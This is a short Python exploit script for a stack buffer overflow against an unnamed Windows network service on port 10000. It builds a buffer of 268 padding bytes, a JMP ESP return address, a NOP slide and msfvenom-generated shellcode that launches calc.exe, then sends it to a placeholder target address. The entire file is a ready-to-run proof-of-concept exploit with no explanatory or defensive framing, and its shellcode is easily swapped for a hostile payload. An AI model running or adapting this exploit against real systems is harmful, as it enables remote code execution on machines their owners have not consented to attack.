import socket
import sys
from time import sleep
# 759E5C73   FFE4             JMP ESP

# msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -f c -b '\x00'

shellc0de = (
"\xba\x87\x1e\x35\x60\xdb\xd7\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x31\x31\x56\x13\x03\x56\x13\x83\xee\x7b\xfc\xc0\x9c\x6b\x83"
"\x2b\x5d\x6b\xe4\xa2\xb8\x5a\x24\xd0\xc9\xcc\x94\x92\x9c\xe0"
"\x5f\xf6\x34\x73\x2d\xdf\x3b\x34\x98\x39\x75\xc5\xb1\x7a\x14"
"\x45\xc8\xae\xf6\x74\x03\xa3\xf7\xb1\x7e\x4e\xa5\x6a\xf4\xfd"
"\x5a\x1f\x40\x3e\xd0\x53\x44\x46\x05\x23\x67\x67\x98\x38\x3e"
"\xa7\x1a\xed\x4a\xee\x04\xf2\x77\xb8\xbf\xc0\x0c\x3b\x16\x19"
"\xec\x90\x57\x96\x1f\xe8\x90\x10\xc0\x9f\xe8\x63\x7d\x98\x2e"
"\x1e\x59\x2d\xb5\xb8\x2a\x95\x11\x39\xfe\x40\xd1\x35\x4b\x06"
"\xbd\x59\x4a\xcb\xb5\x65\xc7\xea\x19\xec\x93\xc8\xbd\xb5\x40"
"\x70\xe7\x13\x26\x8d\xf7\xfc\x97\x2b\x73\x10\xc3\x41\xde\x7e"
"\x12\xd7\x64\xcc\x14\xe7\x66\x60\x7d\xd6\xed\xef\xfa\xe7\x27"
"\x54\xe4\x05\xe2\xa0\x8d\x93\x67\x09\xd0\x23\x52\x4d\xed\xa7"
"\x57\x2d\x0a\xb7\x1d\x28\x56\x7f\xcd\x40\xc7\xea\xf1\xf7\xe8"
"\x3e\x92\x96\x7a\xa2\x7b\x3d\xfb\x41\x84")

offset = 268
nop_slides = '\x90' * 32
buffer = '\x41'*offset + '\x73\x5C\x9E\x75' + nop_slides + shellc0de

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('targetiphere', 10000))
s.send(buffer)
s.close()
print("[+] Payload sent!")
